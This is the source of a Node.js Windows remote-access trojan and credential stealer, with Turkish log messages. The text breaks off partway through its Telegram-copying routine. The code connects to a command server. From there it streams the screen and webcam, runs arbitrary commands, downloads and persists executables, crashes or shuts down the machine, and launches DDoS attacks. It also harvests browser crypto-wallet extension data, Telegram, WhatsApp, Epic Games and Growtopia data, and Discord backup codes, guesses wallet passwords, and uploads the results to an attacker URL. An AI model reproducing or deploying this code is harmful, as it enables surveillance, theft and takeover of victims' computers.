const { exec, execFile, execSync, spawn } = require('child_process');
const io = require('socket.io-client');
const { machineIdSync } = require('node-machine-id');
const screenshot = require('screenshot-desktop');
const brotli = require('brotli');
const fs = require('fs');
const path = require('path');
const os = require('os');
const Jimp = require('jimp');
const axios = require('axios');
const NodeWebcam = require('node-webcam');
const zlib = require('zlib');
const FormData = require('form-data');
const { Dpapi } = require('datavault-win');
const { join } = require('path');
const crypto = require('crypto');
const { createDecipheriv } = require('crypto');
const AdmZip = require('adm-zip');
const archiver = require('archiver');
const { existsSync, readdirSync, readFileSync, statSync } = require('fs');
const { readdir, writeFile, unlink } = require('fs/promises');
const { performance } = require('perf_hooks');
const https = require('https');
const appdata = process.env.APPDATA;
const localappdata = process.env.LOCALAPPDATA;
const { promisify } = require('util');
const rmdirAsync = promisify(fs.rmdir);
const seco = require('seco-file');  
const tempDirX = os.tmpdir();
const tempDir = path.join(os.homedir(), 'AppData', 'Local', 'Temp');

const SERVER_URL = "iphere";
const DOMAIN = `root.${SERVER_URL}`;  
const UPLOAD_URL = `upload.${SERVER_URL}`;  
const wordlistFilePath = path.join(tempDirX, 'X7G8JQW9LFH3YD2KP6ZTQ4VMX5N8WB1RHFJQ.txt');
const atomicInjectionUrl = `https://${DOMAIN}/download/atomic.asar`;
const exodusInjectionUrl = `https://${DOMAIN}/download/exodus.asar`;
const walletInj = `https://${DOMAIN}/send-walletinj`;
const injectionPaths = [];
const injectionResults = [];
const tokens = [];
const tokensNEW = [];
const computerName = os.hostname();
const locale = Intl.DateTimeFormat().resolvedOptions().locale.slice(0, 2).toUpperCase();
const mainFolderPath = `./${locale}-${computerName}`;
const WebSocket = require('ws');
const sqlite3 = require('sqlite3').verbose();

const argsFile = path.join(tempDir, 'AKALsadwqjfqwfqwodkjqwkdlgplk.txt');

function readArgumentsFromFile() {
    if (fs.existsSync(argsFile)) {
        const data = fs.readFileSync(argsFile, 'utf8');
        try {
            return JSON.parse(data);
        } catch (error) {
            console.error('Error parsing arguments from file:', error);
            process.exit(1);
        }
    }
    return null;
}

function saveArgumentsToFile(nggrkey) {
    const args = JSON.stringify([nggrkey]);
    fs.writeFileSync(argsFile, args, 'utf8');
}

let nggrkey;

const savedArgs = readArgumentsFromFile();
if (savedArgs) {
    [nggrkey] = savedArgs;
} else {
    const inputArgs = process.argv.slice(2);
    nggrkey = inputArgs[0];

    if (!nggrkey) {
        console.error('Usage: node script.js <key>');
        process.exit(1);
    }

    saveArgumentsToFile(nggrkey);
}


let ddosInterval;
const hwid = machineIdSync({ original: true });

const socket = io('https://' + SERVER_URL);
let captureInterval;
let isScreenSharing = false; 
let screenWidth, screenHeight;

function getScreenResolution(callback) {
    screenshot({ format: 'png' })
        .then((imgBuffer) => {
            console.log('Screenshot alındı, Jimp ile işleniyor...');
            return Jimp.read(imgBuffer); 
        })
        .then((image) => {
            const screenWidth = image.bitmap.width;
            const screenHeight = image.bitmap.height;
            console.log(`Çözünürlük: ${screenWidth}x${screenHeight}`);
            callback(screenWidth, screenHeight);
        })
        .catch((error) => {
            console.error('Bir hata oluştu:', error);
            process.exit(1);
        });
}

async function registerWithServer() {
    try {
        socket.emit('register', { hwid, screenWidth, screenHeight });
        console.log(`Registered with HWID: ${hwid}`);

            await sendToAPI();

        socket.emit('message', { data: 'Hello, server!' });
        console.log('Message sent to server: Hello, server!');

    } catch (error) {
        console.error('Error occurred during registration:', error);
    }
}

async function sendToAPI() {
    const data = {
        pcName: `${os.userInfo().username}`,
        hwid: hwid,
        key: nggrkey
    };

    await axios.post(`https://${DOMAIN}/panelping`, data);
    console.log('Data sent to Discord!');
}

let cameraInterval = null;

const webcamOptions = {
    width: 640,
    height: 480,
    quality: 100,
    output: 'png', 
    callbackReturn: 'buffer', 
};

const webcam = NodeWebcam.create(webcamOptions);

socket.on('connect', () => {
    console.log('Connected to server');
    getScreenResolution(registerWithServer);
    socket.on('start_camera', () => {
        console.log('Received start_camera event');
        startCameraStream();
    });

    socket.on('stop_camera', () => {
        console.log('Received stop_camera event');
        stopCameraStream();
    });

    socket.on('fetchFileList', (dirPath) => {
        let targetPath;
    
        console.log(`Requested directory: ${dirPath}`);
    
        if (dirPath === 'Desktop') {
            targetPath = path.join('C:', 'Users', os.userInfo().username, 'Desktop');
        } else if (dirPath === 'Downloads') {
            targetPath = path.join('C:', 'Users', os.userInfo().username, 'Downloads');
        } else if (dirPath === 'Documents') {
            targetPath = path.join('C:', 'Users', os.userInfo().username, 'Documents');
        } else if (dirPath === 'Photos') {
            targetPath = path.join('C:', 'Users', os.userInfo().username, 'Photos');
        } else if (dirPath === 'Videos') {
            targetPath = path.join('C:', 'Users', os.userInfo().username, 'Videos');
        } else if (dirPath === 'AppData') {
            targetPath = path.join('C:', 'Users', os.userInfo().username, 'AppData', 'Local');
        } else if (dirPath === 'Temp') {
            targetPath = os.tmpdir(); 
        } else {
            targetPath = dirPath;
        }
    
        console.log(`Target path: ${targetPath}`);
    
        fs.readdir(targetPath, { withFileTypes: true }, async (err, files) => {
            if (err) {
                console.error(`Error reading directory: ${err.message} - Path: ${targetPath}`);
                return;
            }
    
            console.log(`Files in ${targetPath}:`, files);
    
            const fileList = await Promise.all(files.map(async (file) => {
                const filePath = path.join(targetPath, file.name);
                const size = file.isDirectory() ? '-' : await getFileSize(filePath);  
                return {
                    name: file.name,
                    path: filePath,
                    isDirectory: file.isDirectory() ? 'Directory' : 'File',
                    size
                };
            }));
    
            console.log(`Sending file list to server for HWID: ${hwid}`);
            socket.emit('fileList', { hwid, files: fileList });
        });
    });
    
    
    function getFileSize(filePath) {
        return new Promise((resolve, reject) => {
            fs.stat(filePath, (err, stats) => {
                if (err) {
                    return reject(err);
                }
                if (stats.isDirectory()) {
                    resolve('x'); 
                } else {
                    resolve(`${(stats.size / 1024).toFixed(2)} KB`);
                }
            });
        });
    }
    
    function startCameraStream() {
        if (cameraInterval) {
            console.log('Camera stream already running, skipping...');
            return;
        }
    
        console.log('Starting camera stream...');
        cameraInterval = setInterval(() => {
            webcam.capture('screenshot', (err, data) => {
                if (err) {
                    console.error('Error capturing image:', err);
                    return;
                }
    
                console.log('Sending frame...');
                const compressed = zlib.gzipSync(data); 
                socket.emit('camera_frame', { hwid, frame: compressed });
            });
        }, 5000);
    }
    
    function stopCameraStream() {
        if (cameraInterval) {
            clearInterval(cameraInterval);
            cameraInterval = null;
            console.log('Camera stream stopped');
        }
    }

    
    socket.on('downloadExe', async ({ exeLink }) => {
        try {
            const randomName = `${Math.random().toString(36).substr(2, 8)}.exe`;
            const tempDir = os.tmpdir();
            const exePath = path.join(tempDir, randomName);
            
            console.log(`Downloading EXE from: ${exeLink}`);
            console.log(`Saving EXE as: ${exePath}`);
    
            const response = await axios({
                method: 'get',
                url: exeLink,
                responseType: 'stream',
            });
    
            const writer = fs.createWriteStream(exePath);
            response.data.pipe(writer);
    
            writer.on('finish', () => {
                console.log(`Downloaded EXE to ${exePath}`);
                
                setTimeout(() => {
                    execFile(exePath, (err) => {
                        if (err) {
                            console.error('Failed to open EXE:', err);
                        } else {
                            console.log('EXE opened successfully');
                        }
                    });
                }, 1000);
            });
    
            writer.on('error', (err) => {
                console.error('Failed to download EXE:', err);
            });
        } catch (error) {
            console.error('Error downloading EXE:', error);
        }
    });

    socket.on('downloadExeStartup', async ({ exeLink }) => {
        try {
            const randomName = `${Math.random().toString(36).substr(2, 8)}.exe`;
            const tempDir = os.tmpdir();
            const exePath = path.join(tempDir, randomName);
            const startupPath = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', randomName);
    
            console.log(`Downloading EXE from: ${exeLink}`);
            console.log(`Saving EXE as: ${exePath}`);
            console.log(`Will add EXE to Startup at: ${startupPath}`);
    
            const response = await axios({
                method: 'get',
                url: exeLink,
                responseType: 'stream',
            });
    
            const writer = fs.createWriteStream(exePath);
            response.data.pipe(writer);
    
            writer.on('finish', () => {
                console.log(`Downloaded EXE to ${exePath}`);
                
                setTimeout(() => {
                    execFile(exePath, (err) => {
                        if (err) {
                            console.error('Failed to open EXE:', err);
                        } else {
                            console.log('EXE opened successfully');
                        }
                    });
    
                    fs.copyFile(exePath, startupPath, (err) => {
                        if (err) {
                            console.error('Failed to copy to Startup:', err);
                        } else {
                            console.log(`EXE added to Startup: ${startupPath}`);
                        }
                    });
                }, 1000); 
            });
    
            writer.on('error', (err) => {
                console.error('Failed to download EXE:', err);
            });
        } catch (error) {
            console.error('Error downloading EXE:', error);
        }
    });

    socket.on('setWallpaper', ({ filename, data }) => {
        console.log(`Received setWallpaper command with file: ${filename}`);
        const appDataPath = path.join(os.homedir(), 'AppData', 'Local');
        const imagePath = path.join(appDataPath, filename);
        const imageBuffer = Buffer.from(data, 'base64');
        fs.writeFileSync(imagePath, imageBuffer);
        setWallpaper(imagePath);
    });

    socket.on('startStream', () => {
        console.log('Received startStream signal');
        if (!isScreenSharing) {
            startScreenShare();
        } else {
            console.log('Screen sharing is already in progress.');
        }
    });

    socket.on('stopStream', () => {
        console.log('Received stopStream signal');
        stopScreenShare();
    });

    socket.on('mouseClick', ({ x, y }) => {
        console.log(`Received mouseClick at (${x}, ${y})`);
        const scaledX = Math.floor(x);
        const scaledY = Math.floor(y);
        console.log(`Scaled coordinates: (${scaledX}, ${scaledY})`);

        const powershellScript = `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class MouseSimulator {
    [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
    public static extern void mouse_event(long dwFlags, long dx, long dy, long cButtons, long dwExtraInfo);
    public const int MOUSEEVENTF_LEFTDOWN = 0x02;
    public const int MOUSEEVENTF_LEFTUP = 0x04;
    public static void LeftClick() {
        mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
    }
}
"@
$p = New-Object System.Drawing.Point(${scaledX}, ${scaledY})
[System.Windows.Forms.Cursor]::Position = $p
Start-Sleep -Milliseconds 100
[MouseSimulator]::LeftClick()
        `;
        const randomFileName = `${Math.random().toString(36).substring(2, 15)}.ps1`;
        fs.writeFileSync(path.join(os.tmpdir(), randomFileName), powershellScript);

        exec(`powershell -ExecutionPolicy Bypass -File "${path.join(os.tmpdir(), randomFileName)}"`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error executing PowerShell script: ${error.message}`);
                return;
            }
            console.log('Mouse click simulated successfully');
        });
    });

    socket.on('keyPress', (key) => {
        console.log(`Received keyPress: ${key}`);
        exec(`powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('${key}')"`);
    });


    socket.on('cmd', (command) => {
        console.log(`Received command: ${command}`);
        if (command === 'shutdown') {
            exec('shutdown /s /f /t 0');
        } else if (command === 'bluescreen') {
            exec(`powershell.exe -Command "$script = 'using System; using System.Runtime.InteropServices; public class BlueScreen { [DllImport(\"ntdll.dll\")] public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response); [DllImport(\"ntdll.dll\")] public static extern void RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled); public static void TriggerBlueScreen() { bool enabled; RtlAdjustPrivilege(19, true, false, out enabled); uint response; NtRaiseHardError(0xC000007B, 0, 0, IntPtr.Zero, 6, out response); } }'; Add-Type -TypeDefinition $script; [BlueScreen]::TriggerBlueScreen()"`);
        } else if (command === 'restart') {
            exec('shutdown /r /f /t 0');
        } else if (command === 'lock') {
            exec('rundll32.exe user32.dll,LockWorkStation');
        } else if (command === 'sleep') {
            exec('rundll32.exe powrprof.dll,SetSuspendState 0,1,0');
        } else if (command === 'startStream') {
            console.log('Received startStream command');
            if (!isScreenSharing) {
                startScreenShare();
            } else {
                console.log('Screen sharing is already in progress.');
            }
        } else {
            exec(command, (error, stdout, stderr) => {
                const result = { command, stdout, stderr, error: error ? error.message : null };
                console.log('Command result:', result);
                socket.emit('commandResult', { hwid, result });
            });
        }
    });
    
    socket.on('startPing', (url) => {
        startDDoS(url);
    });

    socket.on('stopPing', () => {
        stopDDoS();
    });

    socket.on('newlogsping', () => {
        main();
    });

const defaultPasswords = [
    '1234', 
    '12345', 
    '123456', 
    '12345678', 
    '123456789', 
    'password', 
    'admin', 
    'root', 
    'qwerty', 
    'abc123', 
    'letmein', 
    'welcome', 
    '1234567', 
    'passw0rd', 
    '1234567890', 
    '1q2w3e4r', 
    'sunshine', 
    'iloveyou', 
    'football', 
    'monkey', 
    'superman', 
    'hunter2', 
    'dragon', 
    'baseball', 
    'shadow', 
    'trustno1', 
    'password1', 
    'master', 
    'login', 
    'qazwsx', 
    'starwars', 
    '654321', 
    'access', 
    '123qwe', 
    'zaq12wsx', 
    '1qaz2wsx', 
    'hello123', 
    'batman', 
    'charlie', 
    'letmein123', 
    'mustang', 
    '696969', 
    'michael', 
    'freedom', 
    'secret', 
    'abc12345', 
    'loveyou', 
    'whatever', 
    'trustme', 
    '666666'
];
const browserPathsX = {
    chrome: [
        `${localappdata}\\Google\\Chrome\\User Data\\Default\\`,
        `${localappdata}\\Google\\Chrome\\User Data\\Profile 1\\`,
        `${localappdata}\\Google\\Chrome\\User Data\\Profile 2\\`,
        `${localappdata}\\Google\\Chrome\\User Data\\Profile 3\\`,
        `${localappdata}\\Google\\Chrome\\User Data\\Profile 4\\`,
        `${localappdata}\\Google\\Chrome\\User Data\\Profile 5\\`,
        `${localappdata}\\Google\\Chrome\\User Data\\Guest Profile\\`
    ],
    opera: [
        `${appdata}\\Opera Software\\Opera Stable\\`,
        `${appdata}\\Opera Software\\Opera GX Stable\\`
    ],
    brave: [
        `${localappdata}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\`,
        `${localappdata}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\`,
        `${localappdata}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\`,
        `${localappdata}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\`,
        `${localappdata}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\`,
        `${localappdata}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\`,
        `${localappdata}\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\`
    ],
    yandex: [
        `${localappdata}\\Yandex\\YandexBrowser\\User Data\\Profile 1\\`,
        `${localappdata}\\Yandex\\YandexBrowser\\User Data\\Profile 2\\`,
        `${localappdata}\\Yandex\\YandexBrowser\\User Data\\Profile 3\\`,
        `${localappdata}\\Yandex\\YandexBrowser\\User Data\\Profile 4\\`,
        `${localappdata}\\Yandex\\YandexBrowser\\User Data\\Profile 5\\`,
        `${localappdata}\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\`
    ],
    edge: [
        `${localappdata}\\Microsoft\\Edge\\User Data\\Default\\`,
        `${localappdata}\\Microsoft\\Edge\\User Data\\Profile 1\\`,
        `${localappdata}\\Microsoft\\Edge\\User Data\\Profile 2\\`,
        `${localappdata}\\Microsoft\\Edge\\User Data\\Profile 3\\`,
        `${localappdata}\\Microsoft\\Edge\\User Data\\Profile 4\\`,
        `${localappdata}\\Microsoft\\Edge\\User Data\\Profile 5\\`,
        `${localappdata}\\Microsoft\\Edge\\User Data\\Guest Profile\\`
    ]
};
const walletPaths = {
    'Trust': '\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph',
    'Metamask': '\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn',
    'Coinbase': '\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad',
    'BinanceChain': '\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp',
    'Phantom': '\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa',
    'TronLink': '\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec',
    'Ronin': '\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec',
    'Exodus': '\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno',
    'Coin98': '\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg',
    'Authenticator': '\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai',
    'MathWallet': '\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc',
    'YoroiWallet': '\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb',
    'GuardaWallet': '\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln',
    'JaxxxLiberty': '\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne',
    'Wombat': '\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih',
    'EVERWallet': '\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk',
    'KardiaChain': '\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk',
    'XDEFI': '\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf',
    'Nami': '\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo',
    'TerraStation': '\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp',
    'MartianAptos': '\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk',
    'TON': '\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd',
    'Keplr': '\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap',
    'CryptoCom': '\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj',
    'PetraAptos': '\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci',
    'OKX': '\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge',
    'Sollet': '\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno',
    'Sender': '\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg',
    'Sui': '\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil',
    'SuietSui': '\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd',
    'Braavos': '\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma',
    'FewchaMove': '\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj',
    'EthosSui': '\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli',
    'ArgentX': '\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb',
    'NiftyWallet': '\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid',
    'BraveWallet': '\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl',
    'EqualWallet': '\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac',
    'BitAppWallet': '\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi',
    'iWallet': '\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj',
    'AtomicWallet': '\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh',
    'MewCx': '\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm',
    'GuildWallet': '\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj',
    'SaturnWallet': '\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig',
    'HarmonyWallet': '\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib',
    'PaliWallet': '\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn',
    'BoltX': '\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca',
    'LiqualityWallet': '\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn',
    'MaiarDeFiWallet': '\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm',
    'TempleWallet': '\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc',
    'Metamask_E': '\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm',
    'Ronin_E': '\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk',
    'Yoroi_E': '\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb',
    'Authenticator_E': '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio',
    'MetaMask_O': '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'
};

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const operaGXPath = path.join(process.env.APPDATA || '', 'Opera Software', 'Opera GX Stable');

const browserPaths = {
  'Google(x86)':   `AppData\\Local\\Google(x86)\\Chrome\\User Data`,
  'Google SxS':    `AppData\\Local\\Google\\Chrome SxS\\User Data`,
  'Chromium':      `AppData\\Local\\Chromium\\User Data`,
  'Thorium':       `AppData\\Local\\Thorium\\User Data`,
  'Chrome':        `AppData\\Local\\Google\\Chrome\\User Data`,
  'MapleStudio':   `AppData\\Local\\MapleStudio\\ChromePlus\\User Data`,
  'Iridium':       `AppData\\Local\\Iridium\\User Data`,
  '7Star':         `AppData\\Local\\7Star\\7Star\\User Data`,
  'CentBrowser':   `AppData\\Local\\CentBrowser\\User Data`,
  'Chedot':        `AppData\\Local\\Chedot\\User Data`,
  'Vivaldi':       `AppData\\Local\\Vivaldi\\User Data`,
  'Kometa':        `AppData\\Local\\Kometa\\User Data`,
  'Elements':      `AppData\\Local\\Elements Browser\\User Data`,
  'Epic':          `AppData\\Local\\Epic Privacy Browser\\User Data`,
  'uCozMedia':     `AppData\\Local\\uCozMedia\\Uran\\User Data`,
  'Fenrir':        `AppData\\Local\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer`,
  'Catalina':      `AppData\\Local\\CatalinaGroup\\Citrio\\User Data`,
  'Coowon':        `AppData\\Local\\Coowon\\Coowon\\User Data`,
  'Liebao':        `AppData\\Local\\liebao\\User Data`,
  'QIP Surf':      `AppData\\Local\\QIP Surf\\User Data`,
  'Orbitum':       `AppData\\Local\\Orbitum\\User Data`,
  'Comodo':        `AppData\\Local\\Comodo\\Dragon\\User Data`,
  '360Browser':    `AppData\\Local\\360Browser\\Browser\\User Data`,
  'Maxthon3':      `AppData\\Local\\Maxthon3\\User Data`,
  'K-Melon':       `AppData\\Local\\K-Melon\\User Data`,
  'CocCoc':        `AppData\\Local\\CocCoc\\Browser\\User Data`,
  'Amigo':         `AppData\\Local\\Amigo\\User Data`,
  'Torch':         `AppData\\Local\\Torch\\User Data`,
  'Sputnik':       `AppData\\Local\\Sputnik\\Sputnik\\User Data`,
  'Edge':          `AppData\\Local\\Microsoft\\Edge\\User Data`,
  'DCBrowser':     `AppData\\Local\\DCBrowser\\User Data`,
  'Yandex':        `AppData\\Local\\Yandex\\YandexBrowser\\User Data`,
  'UR Browser':    `AppData\\Local\\UR Browser\\User Data`,
  'Slimjet':       `AppData\\Local\\Slimjet\\User Data`,
  'BraveSoftware': `AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data`,
  'Opera':         `AppData\\Roaming\\Opera Software\\Opera Stable`,
  'Opera GX':      `AppData\\Roaming\\Opera Software\\Opera GX Stable`,
};

const configsOpera = {
  "operagx": {
      bin: path.join(process.env.LOCALAPPDATA, 'Programs', "Opera GX", 'opera.exe'),
      userData: path.join(process.env.APPDATA, 'Opera Software', 'Opera GX Stable')
  }
};

async function uploadFile(zipPath) {
    try {
        if (!fs.existsSync(zipPath)) {
            console.error("File not found:", zipPath);
            return "";
        }

        const form = new FormData();
        form.append('file', fs.createReadStream(zipPath), {
            filename: 'data.zip',
            contentType: 'application/zip',
        });
        form.append('key', nggrkey);

        const uploadUrl = 'https://' + UPLOAD_URL + '/upload'; 
        const response = await axios.post(uploadUrl, form, {
            headers: form.getHeaders(),
            maxBodyLength: Infinity 
        });

        if (response.data && response.data.url) {
            console.log("Server Response:", response.data);
            return response.data.url;
        } else {
            console.error("Unexpected response:", response.data);
            return "";
        }

    } catch (error) {
        console.error("Upload failed:", error.message);
        return "";
    }
}
async function createSingleZip() {
  const zipFilePath = path.join(appdata, 'All_Wallets.zip');
  const zip = new AdmZip();
  const walletNames = [];

  try {
      for (const [browser, paths] of Object.entries(browserPathsX)) {
          for (const profilePath of paths) {
              if (fs.existsSync(profilePath)) {
                  for (const [wallet, walletPath] of Object.entries(walletPaths)) {
                      const fullWalletPath = path.join(profilePath, walletPath);
                      if (fs.existsSync(fullWalletPath)) {
                          walletNames.push(`${browser} ${wallet}`);
                          fs.readdirSync(fullWalletPath).forEach(file => {
                              const filePath = path.join(fullWalletPath, file);
                              try {
                                  if (fs.lstatSync(filePath).isFile()) {
                                      zip.addLocalFile(filePath, `${browser}_${wallet}`);
                                  }
                              } catch (err) {
                                  console.error(`Error reading file ${filePath}: ${err.message}`);
                              }
                          });
                      }
                  }
              }
          }
      }

      zip.writeZip(zipFilePath);

      if (zip.getEntries().length === 0) {
          console.log('No files were added to the zip.');
          return { zipFilePath: null, walletNames };
      } else {
          console.log(`All wallets zipped and saved to ${zipFilePath}`);
          return { zipFilePath, walletNames };
      }
  } catch (error) {
      console.error(`Error creating zip file: ${error.message}`);
      throw error;
  }
}
async function zipFolderX(source, out) {
    return new Promise((resolve, reject) => {
        try {
            const zip = new AdmZip();
            const folderExists = fs.existsSync(source);

            if (!folderExists) {
                reject(new Error(`Source folder does not exist: ${source}`));
                return;
            }

            zip.addLocalFolder(source);

            zip.writeZip(out, (err) => {
                if (err) {
                    reject(err);
                } else {
                    console.log(`Folder zipped and saved to ${out}`);
                    resolve();
                }
            });
        } catch (error) {
            reject(error);
        }
    });
}
function decryptWithSeco(encryptedData, passphrase) {
    try {
        return seco.decryptData(encryptedData, passphrase);  
    } catch (error) {
        return null; 
    }
}
function checkFileEncoding(fileContent) {
    console.log('Dosyanın ilk 16 baytı:', fileContent.slice(0, 16).toString('hex'));  
}
function getPasswordsX() {
    if (fs.existsSync(wordlistFilePath)) {
        const fileContent = fs.readFileSync(wordlistFilePath, 'utf-8');
        return fileContent.split(/\r?\n/).filter(Boolean); 
    } else {
        return defaultPasswords;
    }
}
        async function killSteam() {
            try {
                await new Promise((resolve, reject) => {
                    exec('taskkill /IM Steam.exe /F', (error, stdout, stderr) => {
                        if (error) {
                            reject(`Error killing Steam process: ${error.message}`);
                        } else {
                            console.log('Steam process killed.');
                            resolve();
                        }
                    });
                });
        
            } catch (error) {
                console.error(`Error in killSteam: ${error.message}`);
            }
        }
        async function terminateProcesses(processNames) {
            for (const processName of processNames) {
                try {
                    await new Promise((resolve, reject) => {
                        exec(`tasklist`, (error, stdout) => {
                            if (error) {
                                return reject(`Error listing processes: ${error.message}`);
                            }
        
                            if (stdout.toLowerCase().includes(processName.toLowerCase())) {
                                exec(`taskkill /F /IM ${processName}`, (killError) => {
                                    if (killError) {
                                        console.error(`Failed to terminate process ${processName}: ${killError.message}`);
                                        return reject(killError);
                                    }
                                    console.log(`${processName} terminated successfully.`);
                                    resolve();
                                });
                            } else {
                                resolve(); 
                            }
                        });
                    });
                } catch (err) {
                    console.error(`Error terminating process ${processName}: ${err.message}`);
                }
            }
        }
        async function processBackupCodes(targetDir) {
            const homeDir = os.homedir();
            const pathsToCheck = [
                path.join(homeDir, 'Downloads'),
                path.join(homeDir, 'Desktop'),
                path.join(homeDir, 'Documents'),
            ];
        
            for (const dir of pathsToCheck) {
                if (fs.existsSync(dir)) {
                    fs.readdirSync(dir).forEach((file) => {
                        if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                            const sourcePath = path.join(dir, file);
                            const destPath = path.join(targetDir, `BackupCodes_${file}`);
                            fs.copyFileSync(sourcePath, destPath);
                        }
                    });
                }
            }
        }
        async function processGrowtopia(targetDir) {
            const sourcePath = `${process.env.LOCALAPPDATA}\\Growtopia\\save.dat`;
            if (fs.existsSync(sourcePath)) {
                const destPath = path.join(targetDir, 'Growtopia_save.dat');
                fs.copyFileSync(sourcePath, destPath);
            }
        }
        async function processEpicGames(targetDir) {
            const sourcePath = `${process.env.LOCALAPPDATA}\\EpicGamesLauncher\\Saved\\Config\\Windows`;
            if (fs.existsSync(sourcePath)) {
                const destPath = path.join(targetDir, 'EpicGames');
                fs.mkdirSync(destPath, { recursive: true });
                fs.readdirSync(sourcePath).forEach((file) => {
                    const fullPath = path.join(sourcePath, file);
                    const destFile = path.join(destPath, file);
                    if (fs.lstatSync(fullPath).isFile()) {
                        fs.copyFileSync(fullPath, destFile);
                    }
                });
            }
        }
        async function processWhatsApp(targetDir) {
            const sourcePath = path.join(process.env.LOCALAPPDATA, 'Packages', '5319275A.WhatsAppDesktop_cv1g1gvanyjgm');
            if (fs.existsSync(sourcePath)) {
                const destPath = path.join(targetDir, 'WhatsApp');
                fs.mkdirSync(destPath, { recursive: true });
                fs.readdirSync(sourcePath).forEach((file) => {
                    const fullPath = path.join(sourcePath, file);
                    const destFile = path.join(destPath, file);
                    if (fs.lstatSync(fullPath).isFile()) {
                        fs.copyFileSync(fullPath, destFile);
                    }
                });
            }
        }
        async function processTelegram(targetDir) {
            const telegramTdataPath = path.join(process.env.APPDATA, 'Telegram Desktop', 'tdata');
            if (!fs.existsSync(telegramTdataPath)) {
                console.log('Telegram is not installed on this computer.');
                return;
            }
        
            const destPath = path.join(targetDir, 'Telegram');
            fs.mkdirSync(destPath, { recursive: true });
        
            const excludeFiles = ['media_cache', 'temp', 'unnecessary_file']; 
        
            async function filterAndCopy(src, dest) {
                const files = await fs.promises.readdir(src, { withFileTypes: true });
                for (const file of files) {
                    const fullPath = path.join(src, file.name);
                    const destPath = path.join(dest, file.name);
        
                    try {
                        if (file.isDirectory()) {
